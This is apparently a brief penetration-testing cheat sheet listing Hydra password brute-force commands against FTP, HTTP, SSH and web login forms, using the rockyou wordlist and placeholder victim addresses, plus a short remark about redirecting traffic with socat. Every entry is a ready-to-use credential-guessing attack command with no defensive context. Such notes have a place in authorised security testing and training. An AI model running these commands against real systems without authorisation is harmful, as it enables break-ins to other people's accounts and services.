-  Hydra by ftp

````shell
hydra -l user -P passwords.txt ftp://<target-ip>
````

- Hydra for http form:

```shell
hydra -l fox -P /usr/share/wordlists/rockyou.txt -u -s 80 IP_HOST http-head
```

- Brute force ssh:
	- Use it when you can perform a redirection of the traffic to the ssh port but you have modified the configuration from the inside with socat

```shell
hydra -l USER -P /usr/share/wordlists/rockyou.txt ssh://IP_VICTIM:PORT
```

- Brute force login form:

```shell
hydra -L USERFILE -P PASSWORDFILE DOMAIN/IP METHOD "REDIRECTIONURL:PARAMETERS:FAILMESSAGE:H=COOKIES"
```

